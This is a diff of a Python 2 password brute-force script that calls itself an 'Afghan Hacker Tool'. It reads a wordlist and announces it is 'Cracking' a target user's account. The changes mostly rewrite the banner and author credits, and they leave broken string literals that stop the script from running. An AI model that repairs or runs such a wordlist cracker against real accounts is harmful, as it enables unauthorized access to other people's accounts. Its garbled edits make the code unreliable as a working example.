@@ -10,11 +10,22 @@ except ModuleNotFoundError:
     print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
     exit()
 os.system("clear")
-print """
-
+print "
+______________________________________________________ |
+|.            Name:  Shahidullah Taraki                                   |
+|.                       Friend.  Mjawad Akram.                       |
+|.           ================================.                |
+|                         {     }               [  ]               {    }                         |
+|.                                                                                                 |
+|.                                           [       ]                                             |
+|.                                                                                                 |
+|.                                                                                                 |
+|.                                                                                                 |
+_______________________________________________________
+##############] Coded By Shahid ullah Taraki [##############|
 \033[1;97m           [🇦🇫\033.  Devlup Shahid   🇦🇫\033[1;97m]
 \033[1;97m           [
-\033[1;97mYoutube: Technical Shahid 💎\033[1;97m]          
+\033[1;97m           [Youtube: Technical Shahid 💎\033[1;97m]          
 \033[1;47m\033[1;35m          Afghan Hacker Tool               \033[1;0m
 """    
 time.sleep(0.5)
@@ -24,14 +35,16 @@ wrdlstFileName = raw_input('\n[+] Enter Wordlist Directory : ')
 try:
     wordlist = open(wrdlstFileName, 'r')
 except FileNotFoundError:
-    print ('\n[!] File Not Found!')
+    print ('\n[!] File Not Found
+Please Enter pass.txt
+!')
     exit()
 
 time.sleep(0.8)
 print '\n\nCracking '+user+' Now...'
 
 time.sleep(1)
-print '\033[1;47m\033[1;31m               Attack Is started                 \033[1;0m   '
+print '\033[1;47m\033[1;31m               Attack Is started    By shahid Omar             \033[1;0m   '
 for password in wordlist:
     if password == '' or password == ' ':
         pass
